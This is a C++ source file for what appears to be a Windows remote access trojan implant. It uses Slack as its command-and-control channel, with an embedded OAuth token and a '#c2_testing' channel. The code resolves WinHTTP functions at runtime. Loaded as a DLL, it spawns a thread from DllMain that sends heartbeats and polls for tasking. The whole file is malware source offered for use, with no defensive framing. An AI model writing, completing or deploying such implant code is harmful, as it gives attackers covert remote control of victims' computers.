
#include "main.h"
#include "rat.h"
#include "lwhp/UnWindows.h"
#include "lwhp/_winhttp.h"

#include <iostream>
#include <thread>
#include <chrono>


#define STRINGIFY(...) #__VA_ARGS__
#define STR(...) STRINGIFY(__VA_ARGS__)
const char* slack_oauth =
{
#include "slack_auth.txt"
};



PWinHttpCloseHandle pWinHttpCloseHandle;
PWinHttpCrackUrl pWinHttpCrackUrl;
PWinHttpConnect pWinHttpConnect;
PWinHttpCreateUrl pWinHttpCreateUrl;
PWinHttpOpen pWinHttpOpen;
PWinHttpOpenRequest pWinHttpOpenRequest;
PWinHttpQueryDataAvailable pWinHttpQueryDataAvailable;
PWinHttpQueryHeaders pWinHttpQueryHeaders;
PWinHttpReadData pWinHttpReadData;
PWinHttpReceiveResponse pWinHttpReceiveResponse;
PWinHttpSendRequest pWinHttpSendRequest;
PWinHttpWriteData pWinHttpWriteData;

PWinHttpSetTimeouts pWinHttpSetTimeouts;
PWinHttpSetOption pWinHttpSetOption;
PWinHttpAddRequestHeaders pWinHttpAddRequestHeaders;
PWinHttpGetIEProxyConfigForCurrentUser pWinHttpGetIEProxyConfigForCurrentUser;
PWinHttpGetProxyForUrl pWinHttpGetProxyForUrl;

PGetAdaptersInfo pGetAdaptersInfo;

using std::string;

static HMODULE load_dll(const wchar_t* dll_name) {
    wchar_t dll_path[MAX_PATH + 100];
    int dir = GetSystemDirectory(dll_path, MAX_PATH);
    if (dir > 0 && dir < MAX_PATH)
    {
        if (dll_path[dir - 1] != '\\' &&
            dll_path[dir - 1] != '/')
            wcscat(dll_path, L"\\");
        wcscat(dll_path, dll_name);
        return LoadLibrary(dll_path);
    }
    return NULL;
}

static int lookup_funcs(void)
{
    HMODULE winhttp = NULL;
    HMODULE iphlpapi = NULL;

    if (lookup_done)
        return funcs_found;

    winhttp = load_dll(L"winhttp.dll");
    iphlpapi = load_dll(L"iphlpapi.dll");

    if (winhttp != NULL)
    {
        pWinHttpCloseHandle = (BOOL(WINAPI*) (HINTERNET)) GetProcAddress(winhttp, "WinHttpCloseHandle");
        pWinHttpCrackUrl = (BOOL(WINAPI*) (LPCWSTR, DWORD, DWORD, LPURL_COMPONENTS)) GetProcAddress(winhttp, "WinHttpCrackUrl");
        pWinHttpConnect = (HINTERNET(WINAPI*) (HINTERNET, LPCWSTR, INTERNET_PORT, DWORD)) GetProcAddress(winhttp, "WinHttpConnect");
        pWinHttpCreateUrl = (BOOL(WINAPI*) (LPURL_COMPONENTS, DWORD, LPWSTR, LPDWORD)) GetProcAddress(winhttp, "WinHttpCreateUrl");
        pWinHttpOpen = (HINTERNET(WINAPI*) (LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD)) GetProcAddress(winhttp, "WinHttpOpen");
        pWinHttpOpenRequest = (HINTERNET(WINAPI*) (HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD)) GetProcAddress(winhttp, "WinHttpOpenRequest");
        pWinHttpQueryDataAvailable = (BOOL(WINAPI*) (HINTERNET, LPDWORD)) GetProcAddress(winhttp, "WinHttpQueryDataAvailable");
        pWinHttpQueryHeaders = (BOOL(WINAPI*) (HINTERNET, DWORD, LPCWSTR, LPVOID, LPDWORD, LPDWORD)) GetProcAddress(winhttp, "WinHttpQueryHeaders");
        pWinHttpReadData = (BOOL(WINAPI*) (HINTERNET, LPVOID, DWORD, LPDWORD)) GetProcAddress(winhttp, "WinHttpReadData");
        pWinHttpReceiveResponse = (BOOL(WINAPI*) (HINTERNET, LPVOID)) GetProcAddress(winhttp, "WinHttpReceiveResponse");
        pWinHttpSendRequest = (BOOL(WINAPI*) (HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR)) GetProcAddress(winhttp, "WinHttpSendRequest");
        pWinHttpWriteData = (BOOL(WINAPI*) (HINTERNET, LPCVOID, DWORD, LPDWORD)) GetProcAddress(winhttp, "WinHttpWriteData");
        pWinHttpSetTimeouts = (BOOL(WINAPI*) (HINTERNET, int, int, int, int)) GetProcAddress(winhttp, "WinHttpSetTimeouts");
        pWinHttpSetOption = (BOOL(WINAPI*) (HINTERNET, DWORD, LPVOID, DWORD)) GetProcAddress(winhttp, "WinHttpSetOption");
        pWinHttpAddRequestHeaders = (BOOL(WINAPI*) (HINTERNET, LPCWSTR, DWORD, DWORD)) GetProcAddress(winhttp, "WinHttpAddRequestHeaders");
        pWinHttpGetIEProxyConfigForCurrentUser = (BOOL(WINAPI*) (WINHTTP_CURRENT_USER_IE_PROXY_CONFIG*)) GetProcAddress(winhttp, "WinHttpGetIEProxyConfigForCurrentUser");
        pWinHttpGetProxyForUrl = (BOOL(WINAPI*) (HINTERNET, LPCWSTR, WINHTTP_AUTOPROXY_OPTIONS*, WINHTTP_PROXY_INFO*)) GetProcAddress(winhttp, "WinHttpGetProxyForUrl");
        pGetAdaptersInfo = (BOOL(WINAPI*) (PIP_ADAPTER_INFO, PULONG)) GetProcAddress(iphlpapi, "GetAdaptersInfo");

        if (pWinHttpCloseHandle &&
            pWinHttpCrackUrl &&
            pWinHttpConnect &&
            pWinHttpCreateUrl &&
            pWinHttpOpen &&
            pWinHttpOpenRequest &&
            pWinHttpQueryDataAvailable &&
            pWinHttpQueryHeaders &&
            pWinHttpReadData &&
            pWinHttpReceiveResponse &&
            pWinHttpSendRequest &&
            pWinHttpWriteData &&
            pWinHttpSetTimeouts &&
            pWinHttpSetOption &&
            pGetAdaptersInfo)
            funcs_found = TRUE;
    }
    lookup_done = TRUE;
    return funcs_found;
}




extern "C" __declspec(dllexport) void __cdecl run(void) {
    while (true) { 
        if (WaitForSingleObject(ghExitProcess, 0) == WAIT_OBJECT_0) break;

        std::this_thread::sleep_for(std::chrono::minutes(1));
    }
};

extern "C" __declspec(dllexport) void __cdecl stop(void) {
    SetEvent(ghExitProcess);
};

DWORD WINAPI _run(LPVOID lpParam) {
    if (!lookup_funcs()) {
        return -1;
    }
    StringDict SLACK_AUTHENTICATION = { {
        {"oauth_token", slack_oauth},
        {"c2_channel", "#c2_testing"}
    } };

    RemoteAccessTool rat{ SLACK_AUTHENTICATION };
    

    while (true) {
        if (WaitForSingleObject(ghExitProcess, 0) == WAIT_OBJECT_0) {
            rat.send_termination("stop told me to...");
            break;
        }
        if (rat.heartbeat)
            rat.send_heartbeat();
        rat.get_tasking();
        if (!rat.is_running()) break;
        std::this_thread::sleep_for(std::chrono::seconds(rat.sleep_timer));
    }

    SetEvent(ghExitProcess);
    return 0;
}

#ifdef _WINDLL
BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        ghExitProcess = CreateEvent(NULL, TRUE, FALSE, NULL);

        
        hThread = CreateThread(
            NULL,                   
            0,                      
            _run,                   
            NULL,				    
            0,                      
            &dwThreadId);
        if (hThread == NULL)
        {
            Log("CreateThread failed");
            return FALSE;
        }
        break;
    case DLL_PROCESS_DETACH:
        
        
        
        
        
        
        CloseHandle(ghExitProcess);
        break;
    default:
        break;
    }
    return TRUE;
}
#else
int main()
{
    return _run(NULL);
}

#endif 
